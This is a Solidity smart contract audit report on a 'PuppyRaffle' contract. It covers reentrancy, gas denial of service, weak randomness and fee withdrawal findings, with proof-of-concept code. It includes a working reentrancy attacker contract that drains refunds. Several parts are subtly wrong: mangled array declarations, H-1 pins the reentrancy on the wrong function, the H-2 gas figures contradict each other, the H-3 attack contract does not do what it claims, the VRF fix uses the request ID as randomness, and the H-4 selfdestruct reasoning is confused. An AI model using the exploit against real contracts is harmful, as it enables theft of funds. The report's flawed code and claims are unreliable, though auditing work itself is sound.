### [H-1] Reentrancy vulnerability in `PuppyRaffle::enterRaffle` allows attacker to drain funds

**Description:**  
The `PuppyRaffle::enterRaffle` function is vulnerable to reentrancy attacks. An attacker can exploit this vulnerability by calling the `PuppyRaffle::enterRaffle` function multiple times within a single transaction, causing the contract to recursively call back into itself before the initial call is completed. This allows the attacker to manipulate the contractâ€™s state and potentially withdraw funds more than once, draining the contract's balance. The contract does not have adequate protection against reentrancy, particularly within the refund mechanism.

**Impact:**  
An attacker can use this vulnerability to repeatedly call the `refund` function and drain the contract of its funds. This would allow the attacker to bypass the expected behavior of the contract, leading to loss of funds for the legitimate participants. Moreover, this attack could discourage users from participating in the raffle, as the integrity of the contract is compromised.



**Proof of Concept:**  
The vulnerability can be demonstrated through the following test and contract implementation, which exploits the reentrancy flaw by repeatedly calling the `refund` function.

```solidity
// Part of test for reentrancy attack
function test_reentrancyRefund() public {
    address ;
    players[0] = playerOne;
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = playerFour;
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

    ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
    address attackUser = makeAddr("attackUser");
    vm.deal(attackUser, 1 ether); // to give attackUser some money

    uint256 startingAttackContractBalance = address(attackerContract).balance;
    uint256 startingContractBalance = address(puppyRaffle).balance;

    // Attack
    vm.prank(attackUser);
    attackerContract.attack{value: entranceFee}();

    console.log("starting attacker contract balance: ", startingAttackContractBalance);
    console.log("starting contract balance: ", startingContractBalance);

    console.log("ending attacker contract balance: ", address(attackerContract).balance);
    console.log("ending contract balance: ", address(puppyRaffle).balance);
}
```

```solidity
// ReentrancyAttacker contract that exploits the vulnerability
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address ;
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance < entranceFee) return;
        puppyRaffle.refund(attackerIndex);
    }

    fallback() external payable {
        _stealMoney();
    }

    receive() external payable {
        _stealMoney();
    }
}
```


**Recommended Mitigation:**

To mitigate the reentrancy vulnerability, consider the following approaches:

**Use the "checks-effects-interactions" pattern:**  
   This pattern ensures that all checks and state updates (effects) are performed before making any external calls (such as transferring funds). This prevents an attacker from re-entering the contract during an external call. Ensure that the state is updated before transferring funds to external addresses.

**Add a reentrancy guard modifier:**  

Use a reentrancy guard to prevent recursive calls into the contract. You can use OpenZeppelin's `ReentrancyGuard` modifier to prevent reentrancy attacks.

Example:
```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract PuppyRaffle is ReentrancyGuard {
    function refund(uint256 playerIndex) public nonReentrant {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        payable(msg.sender).sendValue(entranceFee);
        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }
}
```


**Alternatively:**  

```diff

    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

-      payable(msg.sender).sendValue(entranceFee);

        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);

+      payable(msg.sender).sendValue(entranceFee);
    }   
```







### [H-2] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential denial of service (DoS) attack, incrementing gas cost for future entrants.

```shell

Please comment this shell block, this won't be part of the report, it is just to help us figure out the severity [S-#]

### [S-#]

IMPACT: MEDIUM
LIKELIHOOD: MEDIUM (since it will cost a lot to an attacker to do this)

So for us [S-#] = [M-#], we will figure the number # later
```


**Description** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However the longer the `PuppyRaffle::players` array is, the more checks a new player will have to make. This means the gas cost for players who enter right when the raffle starts will be dramatically lower than those who enter later. Every additional address in the `PuppyRaffle::players` array, is an additional check the loop will have to make.  

```javascript
        // Check for duplicates
        // @audit DoS attack  
@>      for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```

**Impact** The gas cost for raffle entrants will greatly increase as more players enter the raffle. Discouraging later users from entering, and causing a rush at the start of the raffle to be one of the first entrants in the queue.

An attacker might fill the raffle `PuppyRaffle::players` array so big, that no one else enters, guaranteeing themselves the win 

**Proof of concept**

If we have two sets of 100 players enter, the gas cost will be as such:
- 1st 100 players: ~6503275 gas 
- 2nd 1500 players: ~1057057316 gas 

This is more than 3x more expensive for the second 100 players.

Place the following test into `PuppyRaffleTest.t.sol`

```javascript
    function testDoS() public {
        vm.txGasPrice(1);
        address[] memory players = new address[](100);

        for (uint i=0; i<100; i++){
            players[i] = address(i);
        }
        
        uint gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee*players.length}(players);

        uint gasEnd = gasleft();
        uint gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
        console.log("Gas cost of first 100 players: ", gasUsedFirst);

        uint nextNumPlayers = 1490;
        address[] memory players2 = new address[](nextNumPlayers);
        for (uint i = 100; i<nextNumPlayers + 100; i++){
            players2[i-100] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee*players2.length}(players2);

        uint gasEnd2 = gasleft();
        // vm.expectRevert("")
        uint gasUsedSecond = (gasStart - gasEnd2) * tx.gasprice;
        console.log("Gas cost of rest of players: ", gasUsedSecond);

        assert(gasUsedFirst < gasUsedSecond);
    }

```
</details>

**Recommended Mitigation** There are a few recommendations.

1. Consider allowing duplicates. Users can make new wallet addresses anyway, so a duplicate check doesn't prevent same person from entering multiple times, only the same wallet address. 
2. Consider a mapping to check for dupplicates. This would allow constant time lookup whether a user has already entered. You could have each raffle have a `uint256` id and the mapping would be a `raffleId` and a `player address` mapped to `true` or `false`.

```diff

+   uint256 public raffleId;   // This will be incremented for next raffle in selectWinner()
+   mapping(uint256 => mapping(address => bool)) public isParticipant;
   
      .
      .
      .

    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+            require(!isParticipant[raffleId][newPlayers[i]], "PuppyRaffle: Duplicate player");      /*+++ new line +++*/
+            isParticipant[raffleId][newPlayers[i]] = true;                                          /*+++ new line +++*/
        }

        // Check for duplicates
-        for (uint256 i = 0; i < players.length - 1; i++) {                              /*+++ drop this line +++*/
-            for (uint256 j = i + 1; j < players.length; j++) {                          /*+++ drop this line +++*/
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");     /*+++ drop this line +++*/
-            }                                                                           /*+++ drop this line +++*/
-        }                                                                               /*+++ drop this line +++*/
        emit RaffleEnter(newPlayers);
    }

    function selectWinner() external {
      
      .
      .
      .

      delete players;
+     raffleId += 1; // incrementing for the next raffle
      raffleStartTime = block.timestamp;
      
      .
      .
      .

    }
```

Alternatively, you could use [OpenZeppelin's `EnumerableSet` library](https://docs.openzeppelin.com/contracts/4.x/api/utils#EnumerableSet).

### [H-3] Weak Randomness in `PuppyRaffle::selectWinner` exposes the contract to predictability and manipulation

**Description:**  
The `PuppyRaffle::selectWinner` function uses predictable values such as `block.timestamp` and `block.difficulty` along with the `keccak256` hash function to generate a winner index and determine token rarity. This approach for generating randomness is weak and easily manipulable. As the values used for randomness, such as the block timestamp and difficulty, are publicly accessible, an attacker can predict the outcome of the raffle, allowing them to influence or control the winner selection process. This compromises the integrity and fairness of the raffle.

**Impact:**  
By using weak randomness in the form of predictable values, an attacker can potentially manipulate the raffle outcome, ensuring they win or influence the result. This exposes the contract to manipulation, leading to unfair results and loss of trust from participants. The fairness of the raffle is significantly undermined, and it becomes vulnerable to front-running attacks where an attacker can predict the winner and enter the raffle at the optimal time. Furthermore, the predictability of the randomness can be exploited by anyone with knowledge of the block properties, which severely compromises the security and credibility of the contract.

**Proof of Concept:**  
To demonstrate the weakness of the randomness mechanism, consider the following snippet:

```solidity
uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
```

The values of block.timestamp and block.difficulty are both publicly accessible and predictable. An attacker can simulate the keccak256 hash computation using known block values to predict the winner of the raffle, thus exploiting the vulnerability.

For example, an attacker can calculate the winning index in advance, enter the raffle at the right moment, and win the prize by matching the predicted winner index. Furthermore, the attacker could also predict the rarity of the token assigned to the winner, thus increasing their chances of acquiring a high-value item.

```solidity
contract ManipulateRaffle {
    PuppyRaffle public puppyRaffle;

    constructor(address _puppyRaffle) {
        puppyRaffle = PuppyRaffle(_puppyRaffle);
    }

    // Predict and manipulate the randomness
    function attack() public {
        uint256 predictedWinnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % puppyRaffle.players.length;
        // Now enter the raffle and guarantee winning
        puppyRaffle.selectWinner();
    }
}
```

This example demonstrates how an attacker can manipulate the selectWinner function by calculating the winner index based on predictable block properties.


**Recommended Mitigation:**  

1. **Use a secure randomness source like Chainlink VRF:**  
   To prevent manipulation and ensure truly random outcomes, the contract should integrate a secure and verifiable randomness source, such as Chainlink's Verifiable Random Function (VRF). This will provide cryptographically secure randomness, ensuring the integrity of the raffle process.

   Example of integration with Chainlink VRF:
   ```solidity
   import "@chainlink/contracts/src/v0.8/interfaces/VRFCoordinatorV2Interface.sol";
   import "@chainlink/contracts/src/v0.8/VRFConsumerBaseV2.sol";

   contract PuppyRaffle is VRFConsumerBaseV2 {
       VRFCoordinatorV2Interface COORDINATOR;

       // Chainlink VRF parameters
       bytes32 keyHash;
       uint64 subscriptionId;

       constructor(address _vrfCoordinator, bytes32 _keyHash, uint64 _subscriptionId) VRFConsumerBaseV2(_vrfCoordinator) {
           COORDINATOR = VRFCoordinatorV2Interface(_vrfCoordinator);
           keyHash = _keyHash;
           subscriptionId = _subscriptionId;
       }

       function selectWinner() external {
           // Request random number from Chainlink VRF
           uint256 requestId = COORDINATOR.requestRandomWords(keyHash, subscriptionId, 3, 200000, 1);
           // Use the random number returned from Chainlink VRF to select the winner
           uint256 winnerIndex = requestId % players.length;
           address winner = players[winnerIndex];
           // Continue with winner selection and prize distribution...
       }
   }
   ```

2. Avoid using block properties for randomness:
As mentioned, values like block.timestamp and block.difficulty should not be used for generating randomness. These values are predictable and can be manipulated by miners. Using Chainlink VRF or another secure oracle is the best practice to ensure the randomness is cryptographically secure and not subject to manipulation.


3. Implement additional checks for randomness verification:
If a secure randomness oracle is not feasible for the contract, consider implementing additional checks or randomness verification mechanisms to mitigate the risk of predictable outcomes. However, using Chainlink VRF remains the most secure and robust solution to ensure fairness in lotteries or raffles.


### [H-4] Mishandling ETH Withdrawals in `PuppyRaffle::withdrawFees` (Incorrect balance check and risks with `selfdestruct`)

**Description:**

The `PuppyRaffle::withdrawFees` function contains a crucial issue when verifying the contract's balance before performing a fee withdrawal. It checks that the contractâ€™s balance is equal to `totalFees` using `address(this).balance == uint256(totalFees)`, which assumes that the contract's balance exactly matches the fees set aside for withdrawal. This check does not account for other dynamic factors such as transaction fees, funds temporarily held in the contract, or potential changes in the balance during the transaction execution.

Furthermore, the function uses the `call{value: feesToWithdraw}("")` method to send ETH to a specified address, which could introduce additional risks if not properly managed. The potential interaction with `selfdestruct` can also pose security concerns, as the contract balance could be emptied unexpectedly, leading to a loss of funds.

**Impact:**

This vulnerability creates several potential risks:

- **Inconsistent state**: If the contract balance does not match `totalFees` at the time of the check, the withdrawal will fail, even if there are enough funds to cover the withdrawal.
- **Unintended behavior**: The `call` method is unsafe when not properly checked for success, especially if the recipient address is a contract that could revert or cause a chain reaction of failures.
- **Selfdestruct risk**: The contract's funds may be emptied due to interactions with `selfdestruct`, allowing an attacker to drain funds unintentionally or maliciously.
- **Loss of user funds**: If multiple withdrawals are attempted or if the contract's state is inconsistent, users may not be able to retrieve their fees, causing loss of trust in the contract.

**Proof of Concept:**

The vulnerability can be demonstrated as follows:

1. Deploy the `PuppyRaffle` contract with some players entering the raffle and accumulating fees.
2. Call `PuppyRaffle::withdrawFees` when the contractâ€™s balance differs from `totalFees`. If the balance is slightly off (e.g., due to transaction fees or other factors), the transaction will fail due to the `require(address(this).balance == uint256(totalFees))` condition.
3. If the contract uses `selfdestruct`, the balance can be drained, leading to a loss of funds.
4. Any attempt to withdraw after this failure will either cause a revert or leave the contract in an inconsistent state.

**Recommended Mitigation:**

To mitigate the risks associated with the `PuppyRaffle::withdrawFees` function, consider the following approaches:

1. **Improve balance check**: Instead of directly comparing `address(this).balance` with `totalFees`, allow a small tolerance or check for sufficient funds (e.g., `address(this).balance >= uint256(totalFees)`). This accounts for slight discrepancies between the contract's balance and the expected `totalFees`.

2. **Safeguard against `selfdestruct`**: Implement additional safeguards that prevent the contract from being selfdestructed or drained unexpectedly. For example, a modifier that ensures certain conditions are met before allowing destructive actions could help.

3. **Reentrancy protection**: Consider using the `ReentrancyGuard` from OpenZeppelinâ€™s `ReentrancyGuard` contract to prevent reentrancy attacks during fee withdrawal operations.

By implementing these recommendations, the security and reliability of the fee withdrawal function can be greatly improved, reducing the risk of loss of funds or contract failures.
